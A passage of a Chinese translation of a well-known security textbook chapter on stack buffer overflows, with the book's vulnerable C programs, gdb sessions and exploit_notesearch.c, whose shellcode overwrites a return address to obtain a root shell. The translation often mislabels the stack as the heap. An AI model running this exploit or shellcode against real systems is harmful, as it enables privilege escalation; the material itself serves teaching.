
# 【翻译】Hacking.The.Art.of.Exploitation,.2nd.Edition0x320

> 原文：[`www.pediy.com/kssd/pediy10/93920.html`](https://www.pediy.com/kssd/pediy10/93920.html)

前面的比较基础，就从 320 开始翻译了，有朋友说已经有中文版的了，不过我还是没有找到第二版的中文版的，哪位朋友找到第二版中文版的了记得发我一份。谢谢。

本章有
两个例子，第一个是直接覆盖。第二个应该是 `JMP ESP`。

## 0x320. 缓冲区溢出概述

缓冲区漏洞可以一直追溯到计算机的早期，然而一直存在到今天。大多数网络蠕虫利用该漏洞传播，不久前出现的 `IE 0day VML` 漏洞就是由缓冲区溢出引起的。

`C` 语言是高级编程语言，但是它将负责数据完整性的责任交给了程序员。如果这个责任交还给编译器，那么在编译的过程中编译器就要对所有的变量进行完整性检测，这将使编译过程变慢。同时这将降低程序员的编程控制能力并且增加编程语言的复杂度。

`C` 的简单可以提升程序员的控制能力和编程开发的效率，但是如果程序员不小心谨慎就会在程序中出现缓冲区溢出和内存泄露问题。这就意味着一旦变量被分配内存，就没有内置的安全保护措施来确保变量的大小和分配的内存空间是否匹配，虽然看上去这将很有可能引起程序出错，但是在 `C` 语言中这是一个合法的操作。这就被称为缓冲区越界或缓冲区溢出，试想超出被分配内存的额外 2 字节的数据发生溢出，这两个字节的数据将会被写到后面的内存中。如果被写入的地址是程序运行的关键部分，那么程序就会出错。下面 `overflow_example.c` 代码就是一个例子。

## 0x320. 缓冲区溢出

### 3.2.1.1. overflow_example.c

代码如下：

```c
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[]) {
   int value = 5;
   char buffer_one[8], buffer_two[8];
   strcpy(buffer_one, "one"); /* 将"one"拷贝到 buffer_one 中*/
   strcpy(buffer_two, "two"); /* 将"two"拷贝到 buffer_two 中*/
   printf("[BEFORE] buffer_two is at %p and contains '%s'\n", buffer_two, buffer_two);
   printf("[BEFORE] buffer_one is at %p and contains '%s'\n", buffer_one, buffer_one);
   printf("[BEFORE] value is at %p and is %d (0x%08x)\n", &value, value, value);
   printf("\n[STRCPY] copying %d bytes into buffer_two\n\n",  strlen(argv[1]));
   strcpy(buffer_two, argv[1]); /*拷贝第一个参数到 buffer_two 中*/
   printf("[AFTER] buffer_two is at %p and contains '%s'\n", buffer_two, buffer_two);
   printf("[AFTER] buffer_one is at %p and contains '%s'\n", buffer_one, buffer_one);
   printf("[AFTER] value is at %p and is %d (0x%08x)\n", &value, value, value);
}
```

到现在为止，通过第二章的学习你应该可以轻松的读懂上面的代码并理解其中含义了。在编译完成后有如下简单输出，我们将拷贝第一个命令行参数（长度为 10 字节）到 `buffer_two` 中，注意这是超过了分配给 `buffer_two` 的 8 字节。

```
reader@hacking:~/booksrc $ gcc -o overflow_example overflow_example.c
reader@hacking:~/booksrc $ ./overflow_example 1234567890
[BEFORE] buffer_two is at 0xbffff7f0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7f8 and contains 'one'
[BEFORE] value is at 0xbffff804 and is 5 (0x00000005)
[STRCPY] copying 10 bytes into buffer_two
[AFTER] buffer_two is at 0xbffff7f0 and contains '1234567890'
[AFTER] buffer_one is at 0xbffff7f8 and contains '90'
[AFTER] value is at 0xbffff804 and is 5 (0x00000005)
reader@hacking:~/booksrc $
```

注意：在内存中 `buffer_one` 是紧随 `buffer_two` 后面的，因此将 10 字节的数据拷贝到 `buffer_two` 中后，后面的 2 个字节“90”发生溢出并写到了 `buffer_one` 中。

除非缓冲区足够大，不然一个超长的变量写入缓冲区将引起缓冲区溢出，导致程序出错或系统崩溃。如下：

```
reader@hacking:~/booksrc $ ./overflow_example AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)
[STRCPY] copying 29 bytes into buffer_two
[AFTER] buffer_two is at 0xbffff7e0 and contains
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAA'
[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)
Segmentation fault (core dumped)
reader@hacking:~/booksrc $
```

这种类型的程序错误是非常普遍的就像我们经常遇到程序出错或蓝屏。导致这样错误的原因在于程序员的疏忽应该对用户的输入进行长度检测或限制。这样的错误经常发生却总是被忽视。事实上 2.8.3.4 节中的 `notesearch.c` 代码就存在一个缓冲区溢出漏洞。即使你已经很熟悉 `C` 语言了，在此之前你可能也没有注意到。

代码如下：

```
reader@hacking:~/booksrc $ ./notesearch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
\-------[ end of note data ]-------
Segmentation fault
reader@hacking:~/booksrc $
```

程序出错很令人恼火，但是在黑客的手上这些漏洞就编程了严重的安全隐患。一个有经验的黑客可以通过控制程序出错流程实现意想不到的效果。`exploit_notesearch.c` 代码将演示这种危险。

### 3.2.1.2. exploit_notesearch.c

代码如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[] =
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";
int main(int argc, char *argv[]) {
   unsigned int i, *ptr, ret, offset=270;
   char *command, *buffer;
   command = (char *) malloc(200);
   bzero(command, 200); // 内存清 0
   strcpy(command, "./notesearch \'"); // 开始命令行缓冲区
   buffer = command + strlen(command); // 设置缓冲区末端
   if(argc > 1) // Set offset.
      offset = atoi(argv[1]);
   ret = (unsigned int) &i - offset; // 设置返回地址
   for(i=0; i < 160; i+=4) // 用返回地址填充缓冲区
      *((unsigned int *)(buffer+i)) = ret;
   memset(buffer, 0x90, 60); // 用 NOP 填充
   memcpy(buffer+60, shellcode, sizeof(shellcode)-1);
   strcat(command, "\'");
   system(command); // 运行 exploit
   free(command);
}
```

这个 exploit 的源代码在后面会深入研究，一般来说，首先产生一个命令字符串，然后执行 `notesearch` 程序并将单引号内的字符作为命令行参数输入。在程序中使用了字符串处理函数帮助我们完成这些工作。`strlen()` 函数的作用是获得字符串长度（用于定位缓冲区指针）；`strcat()` 函数将命令字符连接结束单引号结尾。最后，用 `system` 函数来执行命令字符串。单引号之间的部分是触发缓冲区溢出的主要部分。其余部分只是用来传输这些恶意代码的手段。

```
reader@hacking:~/booksrc $ gcc exploit_notesearch.c
reader@hacking:~/booksrc $ ./a.out
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
\-------[ end of note data ]-------
sh-3.2#
```

这个 exploit 可以通过缓冲区溢出得到一个 `root shell` 提供控制计算机的全部功能。这是一个基于堆的缓冲区溢出利用实例。

## 0x321. 基于堆的缓冲区溢出漏洞

`notesearch` 的 exploit 程序是通过覆盖内存来控制程序执行流程。`auth_overflow.c` 程序阐述了这个观点。

### 3.2.2.1. auth_overflow.c

代码如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int check_authentication(char *password) {
   int auth_flag = 0;
   char password_buffer[16];
   strcpy(password_buffer, password);
   if(strcmp(password_buffer, "brillig") == 0)
      auth_flag = 1;
   if(strcmp(password_buffer, "outgrabe") == 0)
      auth_flag = 1;
   return auth_flag;
}
int main(int argc, char *argv[]) {
   if(argc < 2) {
      printf("Usage: %s <password>\n", argv[0]);
      exit(0);
   }
   if(check_authentication(argv[1])) {
      printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
      printf("      Access Granted.\n");
      printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
   } else {
      printf("\nAccess Denied.\n");
   }
}
```

这个例程从命令行参数中接收一组字符作为密码然后调用 `check_authentication()` 函数。这个函数只允许两个密码，这对典型的多重验证模式来说是很重要的。使用其中任何一个密码函数都会返回“1”允许访问。相信你在编译之前通过阅读源代码就可以明白程序流程并猜想到程序的输出了。在编译的时候要使用 `-g` 参数，因为一会儿我们将调试这个程序。

```
reader@hacking:~/booksrc $ gcc -g -o auth_overflow auth_overflow.c
reader@hacking:~/booksrc $ ./auth_overflow
Usage: ./auth_overflow <password>
reader@hacking:~/booksrc $ ./auth_overflow test
Access Denied.
reader@hacking:~/booksrc $ ./auth_overflow brillig
\-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Access Granted.
\-=-=-=-=-=-=-=-=-=-=-=-=-=-
reader@hacking:~/booksrc $ ./auth_overflow outgrabe
\-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Access Granted.
\-=-=-=-=-=-=-=-=-=-=-=-=-=-
reader@hacking:~/booksrc $
```

到现在为止，程序按照源代码的流程运行着，因此可以准确的预计出程序的运行细节。但是利用缓冲区溢出可能发生意想不到的甚至是相矛盾的现象，例如不用输入一个正确的密码就能访问。

```
reader@hacking:~/booksrc $ ./auth_overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
\-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Access Granted.
\-=-=-=-=-=-=-=-=-=-=-=-=-=-
reader@hacking:~/booksrc $
```

你也许已经发现了发生了什么，让我们用调试器来看一下到底发生了什么。

代码如下：

```
reader@hacking:~/booksrc $ gdb -q ./auth_overflow
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) list 1
1       #include <stdio.h>
2       #include <stdlib.h>
3       #include <string.h>
4
5       int check_authentication(char *password) {
6               int auth_flag = 0;
7               char password_buffer[16];
8
9                strcpy(password_buffer, password);
10
(gdb)
11              if(strcmp(password_buffer, "brillig") == 0)
```



12 `auth_flag` = 1;

13 if(strcmp(`password_buffer`, "outgrabe") == 0)

14 `auth_flag` = 1;

15

16 return `auth_flag`;

17 }

18

19 int `main`(int `argc`, char *`argv`[]) {

20 if(`argc` < 2) {

`(gdb)` `break` 9

Breakpoint 1 at 0x8048421: file `auth_overflow.c`, line 9.

`(gdb)` `break` 16

Breakpoint 2 at 0x804846f: file `auth_overflow.c`, line 16.

`(gdb)`

GDB 调试器使用 `-q` 参数开始来来隐藏欢迎信息，并在第 9 行和第 16 行设置断点。当程序运行时，执行到断点处将被停下来使得我们可以检查内存数据。

代码如下:

`(gdb)` `run` AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Starting program: `/home/reader/booksrc/auth_overflow` AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, `check_authentication` (`password`=0xbffff9af 'A' <repeats 30 times>) at

`auth_overflow.c`:9

9 `strcpy`(`password_buffer`, `password`);

`(gdb)` `x/s` `password_buffer`

0xbffff7a0: ")????o??????)\\205\\004\\b?o??p???????"

`(gdb)` `x/x` &`auth_flag`

0xbffff7bc: 0x00000000

`(gdb)` `print` 0xbffff7bc - 0xbffff7a0

$1 = 28

`(gdb)` `x/16xw` `password_buffer`

0xbffff7a0: 0xb7f9f729 0xb7fd6ff4 0xbffff7d8 0x08048529

0xbffff7b0: 0xb7fd6ff4 0xbffff870 0xbffff7d8 0x00000000

0xbffff7c0: 0xb7ff47b0 0x08048510 0xbffff7d8 0x080484bb

0xbffff7d0: 0xbffff9af 0x08048510 0xbffff838 0xb7eafebc

`(gdb)`

第一个断点在 `strcpy()` 函数发生之前。检测 `password_buffer` 指针，调试器显示它在内存地址 0xbffff7a0 中被任意未初始化数据填充。通过观察 `auth_flag` 变量的地址，我们可以看到它位于 0xbffff7bc 并且值为 0。通过使用打印命令获取信息并计算可以得知 `auth_flag` 在 `password_buffer` 开始之后的 28 字节。也就是说如上关系可以看做是它们位于一个内存块中并以 `password_buffer` 为开始。

代码如下:

`(gdb)` `continue`

Continuing.

Breakpoint 2, `check_authentication` (`password`=0xbffff9af 'A' <repeats 30 times>) at

`auth_overflow.c`:16

16 return `auth_flag`;

`(gdb)` `x/s` `password_buffer`

0xbffff7a0: 'A' <repeats 30 times>

`(gdb)` `x/x` &`auth_flag`

0xbffff7bc: 0x00004141

`(gdb)` `x/16xw` `password_buffer`

0xbffff7a0: 0x41414141 0x41414141 0x41414141 0x41414141

0xbffff7b0: 0x41414141 0x41414141 0x41414141 0x00004141

0xbffff7c0: 0xb7ff47b0 0x08048510 0xbffff7d8 0x080484bb

0xbffff7d0: 0xbffff9af 0x08048510 0xbffff838 0xb7eafebc

`(gdb)` `x/4cb` &`auth_flag`

0xbffff7bc: 65 'A' 65 'A' 0 '\0' 0 '\0'

`(gdb)` `x/dw` &`auth_flag`

0xbffff7bc: 16705

`(gdb)`

继续 `strcpy()` 之后的下一个断点，再仔细检查这些内存单元。`password_buffer` 缓冲区发生溢出，并覆盖了 `auth_flag` 中内容，已经将其前两个字节替换成了 0x41。The value of 0x00004141 might look backward again, but remember that x86 has little-endian architecture, so it's supposed to look that way. If you examine each of these four bytes individually, you can see how the memory is actually laid out. Ultimately, the program will treat this value as an integer, with a value of 16705.

`(gdb)` `continue`

Continuing.

-=-=-=-=-=-=-=-=-=-=-=-=-=-

Access Granted.

-=-=-=-=-=-=-=-=-=-=-=-=-=-

Program exited with code 034.

`(gdb)`

缓冲区溢出之后，`check_authentication()` 函数将返回 16705 而不是 0。因为 if 语句认为任何非零值即为真。程序的执行流程被导向了真的结果。在这个例子中 `auth_flag` 变量是程序流程的执行控制点，因此我们就通过覆盖这个值来实现控制。

这是一个非常牵强的例子，因为它取决与变量的内存单元。在 `auth_overflow2.c` 中，颠倒了变量的位置。

### 3.2.2.2. `auth_overflow2.c`

代码如下:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int check_authentication(char *password) {
  char password_buffer[16];
  int auth_flag = 0;
  strcpy(password_buffer, password);
  if(strcmp(password_buffer, "brillig") == 0)
     auth_flag = 1;
  if(strcmp(password_buffer, "outgrabe") == 0)
     auth_flag = 1;
  return auth_flag;
}
int main(int argc, char *argv[]) {
  if(argc < 2) {
    printf("Usage: %s <password>\n", argv[0]);
    exit(0);
  }
  if(check_authentication(argv[1])) {
    printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
    printf("      Access Granted.\n");
    printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
  } else {
    printf("\nAccess Denied.\n");
  }
}
```

通过简单的更改使得 `auth_flag` 变量在内存中的位置位于 `password_buffer` 之前。这样就取消了使用 `return_value` 变量作为程序执行控制点，因为使用前面的缓冲区溢出方法将不会对它造成影响。

代码如下:

```
reader@hacking:~/booksrc $ gcc -g auth_overflow2.c
reader@hacking:~/booksrc $ gdb -q ./a.out
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) list 1
1       #include <stdio.h>
2       #include <stdlib.h>
3       #include <string.h>
4
5       int check_authentication(char *password) {
6               char password_buffer[16];
7               int auth_flag = 0;
8
9               strcpy(password_buffer, password);
10
(gdb)
```

11 if(strcmp(`password_buffer`, "brillig") == 0)

12 `auth_flag` = 1;

13 if(strcmp(`password_buffer`, "outgrabe") == 0)

14 `auth_flag` = 1;

15

16 return `auth_flag`;

17 }

18

19 int `main`(int `argc`, char *`argv`[]) {

20 if(`argc` < 2) {

`(gdb)` `break` 9

Breakpoint 1 at 0x8048421: file `auth_overflow2.c`, line 9.

`(gdb)` `break` 16

Breakpoint 2 at 0x804846f: file `auth_overflow2.c`, line 16.

`(gdb)` `run` AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Starting program: `/home/reader/booksrc/a.out` AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, `check_authentication` (`password`=0xbffff9b7 'A' <repeats 30 times>) at

`auth_overflow2.c`:9

9 `strcpy`(`password_buffer`, `password`);

`(gdb)` `x/s` `password_buffer`

0xbffff7c0: "?o??\200????????o???G??\020\205\004\b?????\204\004\b????\020\205\004\bH????????\002"

`(gdb)` `x/x` &`auth_flag`

0xbffff7bc: 0x00000000

`(gdb)` `x/16xw` &`auth_flag`

0xbffff7bc: 0x00000000 0xb7fd6ff4 0xbffff880 0xbffff7e8

0xbffff7cc: 0xb7fd6ff4 0xb7ff47b0 0x08048510 0xbffff7e8

0xbffff7dc: 0x080484bb 0xbffff9b7 0x08048510 0xbffff848

0xbffff7ec: 0xb7eafebc 0x00000002 0xbffff874 0xbffff880

`(gdb)`

设置同样的断点，通过检查内存发现 `auth_flag` 在内存中的位置位于 `password_buffer` 之前。这就意味着通过前面的方法 `auth_flag` 是不会被 `password_buffer` 中溢出的数据所覆盖。

代码如下:

`(gdb)` `cont`

Continuing.

Breakpoint 2, `check_authentication` (`password`=0xbffff9b7 'A' <repeats 30 times>)

at `auth_overflow2.c`:16

16 return `auth_flag`;

`(gdb)` `x/s` `password_buffer`

0xbffff7c0: 'A' <repeats 30 times>

`(gdb)` `x/x` &`auth_flag`

0xbffff7bc: 0x00000000

`(gdb)` `x/16xw` &`auth_flag`

0xbffff7bc: 0x00000000 0x41414141 0x41414141 0x41414141

0xbffff7cc: 0x41414141 0x41414141 0x41414141 0x41414141

0xbffff7dc: 0x08004141 0xbffff9b7 0x08048510 0xbffff848

0xbffff7ec: 0xb7eafebc 0x00000002 0xbffff874 0xbffff880

`(gdb)`

正如所料，缓冲区溢出没有影响到 `auth_flag` 变量，因为它的位置提前了。但是还存在另一个程序流程执行控制点，虽然我们在 C 代码中没有看到。它就在所有堆变量之后，因此也已很容易的被覆盖重写。这个内存结构是所有程序执行所必须的，因此它存在于所有程序中，当它被重写，通常将引起程序崩溃。

`(gdb)` `c`

Continuing.

Program received signal SIGSEGV, Segmentation fault.

0x08004141 in ?? ()

`(gdb)`

从前面章节可以知道堆是程序使用的物种内存结构之一。堆是一种先进后出的数据结构，在函数调用过程中为局部变量保持执行流程和执行环境。当一个函数被调用，一个称为堆栈的结构被压入，并且 EIP 寄存器跳转到函数的第一条指令处。每个堆栈包括函数的局部变量和用来恢复 EIP 的返回地址。当函数执行完，执行出栈指令返回用来恢复 EIP 的地址。所有的这些都是程序结构的组成部分，并且通常是由编译器而不是程序员来操作的。

当 `check_authentication()` 函数被调用，一个新的堆栈帧被压入到 `main()` 堆栈帧上面。在这个堆栈帧里面是局部变量、一个返回地址和函数参数。

我们可以在调试器里更清楚的发到所有数据。

图 3-1。

代码如下:

```
reader@hacking:~/booksrc $ gcc -g auth_overflow2.c
reader@hacking:~/booksrc $ gdb -q ./a.out
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) list 1
1       #include <stdio.h>
2       #include <stdlib.h>
3       #include <string.h>
4
5       int check_authentication(char *password) {
6               char password_buffer[16];
7               int auth_flag = 0;
8
9               strcpy(password_buffer, password);
10
(gdb)
```



11              if(strcmp(password_buffer, "brillig") == 0)  
12                      auth_flag = 1;  
13              if(strcmp(password_buffer, "outgrabe") == 0)  
14                      auth_flag = 1;  
15  
16              return auth_flag;  
17      }  
18  
19      int main(int argc, char *argv[]) {  
20              if(argc < 2) {  
(gdb)  
21                      printf("Usage: %s <password>\n", argv[0]);  
22                      exit(0);  
23              }  
24              if(check_authentication(argv[1])) {  
25                      printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");  
26                      printf("      Access Granted.\n");  
27                      printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");  
28              } else {  
29                      printf("\nAccess Denied.\n");  
        }  
(gdb) break 24  
Breakpoint 1 at 0x80484ab: file auth_overflow2.c, line 24.  
(gdb) break 9  
Breakpoint 2 at 0x8048421: file auth_overflow2.c, line 9.  
(gdb) break 16  
Breakpoint 3 at 0x804846f: file auth_overflow2.c, line 16.  
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Starting program: /home/reader/booksrc/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Breakpoint 1, main (argc=2, argv=0xbffff874) at auth_overflow2.c:24  
24              if(check_authentication(argv[1])) {  
(gdb) i r esp  
esp            0xbffff7e0       0xbffff7e0  
(gdb) x/32xw $esp  
0xbffff7e0:     0xb8000ce0      0x08048510      0xbffff848      0xb7eafebc  
0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898  
0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000  
0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848  
0xbffff820:     0x40f5f7f0      0x48e0fe81      0x00000000      0x00000000  
0xbffff830:     0x00000000      0xb7ff9300      0xb7eafded      0xb8000ff4  
0xbffff840:     0x00000002      0x08048350      0x00000000      0x08048371  
0xbffff850:     0x08048474      0x00000002      0xbffff874      0x08048510  

第一个断点在调用 `check_authentication()` 函数之前的 `main()` 函数中。此时堆指针寄存器 `ESP` 的地址是 `0xbffff7e0`，栈顶如上所示。这是 `main()` 堆栈的所有组成部分。继续下一个断点，这个断点在 `check_authentication()` 函数内部，如下输出所示 `ESP` 变小了，是因为它为 `check_authentication()` 的堆栈开辟空间而提升内存的表。在找到 `auth_flag` 变量和 `password_buffer` 变量后，在堆栈中还可以看到具体数据。

代码如下:

```
(gdb) c
Continuing.
Breakpoint 2, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>) at
auth_overflow2.c:9
9               strcpy(password_buffer, password);
(gdb) i r esp
esp            0xbffff7a0       0xbffff7a0
(gdb) x/32xw $esp
0xbffff7a0:     0x00000000      0x08049744      0xbffff7b8      0x080482d9
0xbffff7b0:     0xb7f9f729      0xb7fd6ff4      0xbffff7e8      0x00000000
0xbffff7c0:     0xb7fd6ff4      0xbffff880      0xbffff7e8      0xb7fd6ff4
0xbffff7d0:     0xb7ff47b0      0x08048510      0xbffff7e8      0x080484bb
0xbffff7e0:     0xbffff9b7      0x08048510      0xbffff848      0xb7eafebc
0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898
0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000
0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848
(gdb) p 0xbffff7e0 - 0xbffff7a0
$1 = 64
(gdb) x/s password_buffer
0xbffff7c0:      "?o??\200????????o???G??\020\205\004\b?????\204\004\b????\020\205\004\
bH??????\002"
(gdb) x/x &auth_flag
0xbffff7bc:     0x00000000
(gdb)
```

继续分析 `check_authentication()` 中的第二个断点，当函数调用时执行一个压栈操作。因为堆栈的生长方向是朝着低内存地址的，因此目前的堆栈指针是比第一个断点时少 64 字节的 `0xbffff7a0`。堆栈大小和结构很大程度上取决于函数和某些编译器优化程度。例如，这个堆栈的开始的 24 个字节是编译器生成的内容。局部堆栈变量 `auth_flag` 和 `password_buffer` 则在堆栈中它们各自的内存单元。`auth_flag` 在 `0xbffff7bc`，16 字节的 `password_buffer` 在 `0xbffff7c0`。

堆栈中不仅包括局部变量和编译器信息还包括更多的信息。`check_authentication()` 堆栈的详细组成如下所示。

首先，被用来保存局部变量的内存用斜体字表示。从 `auth_flag` 变量开始于 `0xbffff7bc` 直到 16 字节的 `password_buffer` 变量结束。堆栈中接下来的一些数据是编译器写入的无用信息，附加了一些被称作存储附加指针的数据。如果程序使用 `-fomit-frame-pointer` 参数进行编译，就不会再堆栈中使用框架指针。`0x080484bb` 就是堆栈返回地址，地址 `0xbffffe9b7` 是一个指向包含 30 个 A 的字符串指针。这是 `check_authentication()` 函数的参数。

代码如下:

```
(gdb) x/32xw $esp
0xbffff7a0:     0x00000000      0x08049744      0xbffff7b8      0x080482d9
0xbffff7b0:     0xb7f9f729      0xb7fd6ff4      0xbffff7e8      0x00000000
0xbffff7c0:     0xb7fd6ff4      0xbffff880      0xbffff7e8      0xb7fd6ff4
0xbffff7d0:     0xb7ff47b0      0x08048510      0xbffff7e8      0x080484bb
0xbffff7e0:     0xbffff9b7      0x08048510      0xbffff848      0xb7eafebc
0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898
0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000
0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848
(gdb) x/32xb 0xbffff9b7
0xbffff9b7:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff9bf:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff9c7:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff9cf:     0x41    0x41    0x41    0x41    0x41    0x41    0x00    0x53
(gdb) x/s 0xbffff9b7
0xbffff9b7:      'A' <repeats 30 times>
(gdb)
```

通过了解堆栈是怎么被创建的可以定位堆栈中的返回地址。进程开始于 `main()`，这是在函数调用之前的。

代码如下:

```
(gdb) disass main
Dump of assembler code for function main:
0x08048474 <main+0>:    push   ebp
0x08048475 <main+1>:    mov    ebp,esp
0x08048477 <main+3>:    sub    esp,0x8
0x0804847a <main+6>:    and    esp,0xfffffff0
0x0804847d <main+9>:    mov    eax,0x0
0x08048482 <main+14>:   sub    esp,eax
0x08048484 <main+16>:   cmp    DWORD PTR [ebp+8],0x1
0x08048488 <main+20>:   jg     0x80484ab <main+55>
0x0804848a <main+22>:   mov    eax,DWORD PTR [ebp+12]
0x0804848d <main+25>:   mov    eax,DWORD PTR [eax]
0x0804848f <main+27>:   mov    DWORD PTR [esp+4],eax
0x08048493 <main+31>:   mov    DWORD PTR [esp],0x80485e5
0x0804849a <main+38>:   call   0x804831c <printf@plt>
0x0804849f <main+43>:   mov    DWORD PTR [esp],0x0
0x080484a6 <main+50>:   call   0x804833c <exit@plt>
0x080484ab <main+55>:   mov    eax,DWORD PTR [ebp+12]
0x080484ae <main+58>:   add    eax,0x4
0x080484b1 <main+61>:   mov    eax,DWORD PTR [eax]
0x080484b3 <main+63>:   mov    DWORD PTR [esp],eax                     //注意
0x080484b6 <main+66>:   call   0x8048414 <check_authentication>        //这两条
0x080484bb <main+71>:   test   eax,eax
0x080484bd <main+73>:   je     0x80484e5 <main+113>
0x080484bf <main+75>:   mov    DWORD PTR [esp],0x80485fb
0x080484c6 <main+82>:   call   0x804831c <printf@plt>
0x080484cb <main+87>:   mov    DWORD PTR [esp],0x8048619
0x080484d2 <main+94>:   call   0x804831c <printf@plt>
0x080484d7 <main+99>:   mov    DWORD PTR [esp],0x8048630
0x080484de <main+106>:  call   0x804831c <printf@plt>
0x080484e3 <main+111>:  jmp    0x80484f1 <main+125>
0x080484e5 <main+113>:  mov    DWORD PTR [esp],0x804864d
0x080484ec <main+120>:  call   0x804831c <printf@plt>
0x080484f1 <main+125>:  leave
0x080484f2 <main+126>:  ret
End of assembler dump.
(gdb)
```

注意上面两条指令。此时 `EAX` 寄存器包含一个指向第一个命令行参数的指针。这也是 `check_authentication()` 函数的参数。第一条汇编指令将 `EAX` 的值写入到 `ESP` 所指的地址（栈顶）。`check_authentication()` 函数参数从这个堆栈开始的。第二条指令是实际调用。这条指令将下一条指令的地址压入栈并移动执行指针寄存器 `EIP` 到 `check_authentication()` 函数开始处。压入堆栈的地址就是函数调用后的返回地址。因此下一个指令的地址是 `0x080484bb` 也就是函数调用的返回地址了。

```
(gdb) disass check_authentication
Dump of assembler code for function check_authentication:
0x08048414 <check_authentication+0>:    push   ebp
0x08048415 <check_authentication+1>:    mov    ebp,esp
0x08048417 <check_authentication+3>:    sub    esp,0x38
...
0x08048472 <check_authentication+94>:   leave
0x08048473 <check_authentication+95>:   ret
End of assembler dump.
(gdb) p 0x38
$3 = 56
(gdb) p 0x38 + 4 + 4
$4 = 64
(gdb)
```



程序继续执行到 `check_authentication()` 函数中，此时 `EIP` 发生改变，如上所示开始的几条指令完成保存堆栈功能。这些指令通常是函数开始时的固定指令。前两条指令是为了存储堆栈指针，第三条指令是将 `ESP` 减 38，为函数的局部变量保存 56 字节。返回地址和存贮框架指针已经压入栈，也就是 64 字节堆栈中 8 个字节的作用了。

当函数完成时，`leave` 和 `ret` 指令清除堆栈并设置执行指针寄存器(`EIP`)来保存堆栈中的返回地址。这使得程序在函数调用后执行到 `main()` 函数中的下一条指令，也就是地址 `0x080484bb` 处。这个过程在任何程序的函数调用时都会发生。

### Code View

```
(gdb) x/32xw $esp
0xbffff7a0:     0x00000000      0x08049744      0xbffff7b8      0x080482d9
0xbffff7b0:     0xb7f9f729      0xb7fd6ff4      0xbffff7e8      0x00000000
0xbffff7c0:     0xb7fd6ff4      0xbffff880      0xbffff7e8      0xb7fd6ff4
0xbffff7d0:     0xb7ff47b0      0x08048510      0xbffff7e8      0x080484bb
0xbffff7e0:     0xbffff9b7      0x08048510      0xbffff848      0xb7eafebc
0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898
0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000
0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848
```

```
(gdb) cont
Continuing.
Breakpoint 3, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>)
    at auth_overflow2.c:16
16              return auth_flag;
```

```
(gdb) x/32xw $esp
0xbffff7a0:     0xbffff7c0      0x080485dc      0xbffff7b8      0x080482d9
0xbffff7b0:     0xb7f9f729      0xb7fd6ff4      0xbffff7e8      0x00000000
0xbffff7c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7d0:     0x41414141      0x41414141      0x41414141      0x08004141
0xbffff7e0:     0xbffff9b7      0x08048510      0xbffff848      0xb7eafebc
0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898
0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000
0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848
```

```
(gdb) cont
Continuing.
